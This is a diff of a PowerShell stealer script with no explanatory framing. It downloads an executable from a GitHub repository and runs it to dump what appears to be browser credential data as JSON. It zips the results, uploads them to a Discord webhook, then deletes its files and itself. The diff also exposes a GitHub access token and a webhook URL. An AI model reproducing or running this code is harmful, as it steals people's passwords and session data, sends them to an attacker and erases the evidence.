@@ -1,48 +1,40 @@
-$repoOwner = "yorobsession"
-$repoName = "YorObsession"
-$filePath = "Yor.exe"
-$personalAccessToken = "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"
-
-$apiUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/master/$filePath"
+$filePath = "Yor2.exe"
+$apiUrl = "https://raw.githubusercontent.com/yorobsession/YorObsession/master/Yor2.exe"
 $webhookUrl = "https://discord.com/api/webhooks/1195821964212830289/I-I2dZVEr2aoNVq4DlnTYPD4LYyTQk-67RnASO7EI0189E9w9ArIY2WehEAuX34igDRQ"
 $folderName = "tempyor"
-$filePath = "C:\$folderName\temp.txt"
-$exePath = "C:\$folderName\Yor.exe"
+$filePath = "C:\$folderName\results"
+$exePath = "C:\$folderName\Yor2.exe"
+$zipPath = "$filePath\results.zip"
 
-$headers = @{
-    Authorization = "Bearer $personalAccessToken"
-}
-
-# Use Invoke-RestMethod to download the file
-
-$null = New-Item -Path "C:\" -Name $folderName -ItemType "directory"
-$null = Invoke-RestMethod -Uri $apiUrl -Headers $headers -OutFile $exePath -Method Get
+$ProgressPreference = 'SilentlyContinue'
+$null = New-Item -Path "C:\" -Name $folderName -Force -ItemType "directory"
+$null = Invoke-RestMethod -Uri $apiUrl -OutFile $exePath -Method Get
 Start-Sleep -Seconds 2
-& $exePath /stext $filePath
-Start-Sleep -Seconds 2
-$fileContent = Get-Content -Path $filePath -Raw
-$boundary = [System.Guid]::NewGuid().ToString()
-    
-$script = @"
------------------------------363663446017286492952695560520
-Content-Disposition: form-data; name="payload_json"
+& $exePath -b all -f json --dir $filePath 2>&1 | Out-Null
+Start-Sleep -Seconds 10
+$txtFiles = Get-ChildItem -Path $filePath -Filter "*.json"
+$null = Compress-Archive -Path $txtFiles.FullName -DestinationPath $zipPath -Force
 
-{"content":null,"embeds":null}
------------------------------363663446017286492952695560520
-Content-Disposition: form-data; name="file[0]"; filename="temp.txt"
-Content-Type: text/plain
+# Use .NET HttpClient to send multipart/form-data correctly
+Add-Type -AssemblyName System.Net.Http
+$httpClient = New-Object System.Net.Http.HttpClient
+$multipartContent = New-Object System.Net.Http.MultipartFormDataContent
 
-$fileContent
------------------------------363663446017286492952695560520--
-"@
+# Read the ZIP file as bytes and add to multipart content
+$fileStream = [System.IO.File]::OpenRead($zipPath)
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+$multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipPath))
 
-# Send the updated script to the Discord webhook
-$null = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers @{
-    "Accept" = "application/json"
-    "Content-Type" = "multipart/form-data; boundary=---------------------------363663446017286492952695560520"
-} -Body ([System.Text.Encoding]::UTF8.GetBytes($script))
+# Send the request
+$null = $httpClient.PostAsync($webhookUrl, $multipartContent).Result
 
+# Cleanup
+$fileStream.Dispose()
+$httpClient.Dispose()
+$ProgressPreference = 'Continue'
 $currentScriptPath = $MyInvocation.MyCommand.Path
 
+Remove-Item -Path $txtFiles.FullName -Force
 Remove-Item -Path $currentScriptPath -Force
 Remove-Item "C:\$folderName" -Recurse
